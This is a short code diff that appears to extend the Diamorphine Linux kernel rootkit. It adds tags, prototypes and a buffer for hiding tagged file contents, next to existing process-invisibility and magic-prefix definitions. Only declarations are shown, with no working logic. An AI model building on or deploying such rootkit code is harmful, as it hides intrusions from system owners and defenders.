@@ -5,11 +5,17 @@ struct linux_dirent {
         char            d_name[1];
 };
 
+#define SSIZE_MAX 32767
 #define MAGIC_PREFIX "diamorphine_secret"
-
+#define HIDETAGIN "<viajano>"
+#define HIDETAGOUT "</viajano>"
 #define PF_INVISIBLE 0x10000000
-
+int file_check(void *arg, ssize_t size);
+int hide_content(void *arg, ssize_t size);
+atomic_t read_on;
 #define MODULE_NAME "diamorphine"
+
+char buffer[PAGE_SIZE];
 
 enum {
 	SIGINVIS = 31,
